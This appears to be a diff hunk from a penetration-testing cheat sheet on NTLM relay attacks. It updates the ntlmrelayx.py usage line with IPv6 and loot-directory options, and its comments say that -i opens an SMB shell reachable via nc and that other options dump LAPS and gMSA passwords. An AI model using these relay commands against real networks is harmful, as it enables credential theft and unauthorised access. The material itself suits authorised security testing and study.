@@ -17,11 +17,11 @@ Invoke this attack: request callback to SMB on kali using `\\IP`
         3. Retores RemoteRegistry back to disabled state.
 
 ```bash
-ntlmrelayx.py [-t TARGET | -tf TARGET_FILE] -smb2support [-i] [-e "SHELL.exe"] [-c "COMMANDS"]
+ntlmrelayx.py [-6] [-t TARGET | -tf TARGET_FILE] -smb2support [-l LOOT_DIR] [-i] [-e "SHELL.exe"] [-c "COMMANDS"]
+# -6: IPv6
 # -i: will open a smb shell, can connect using nc IP PORT
 # --dump-laps: dump LAPS passwords
 # --dump-gmsa: dump gMSA passwords
-
 ```
 
 ## SMB-check
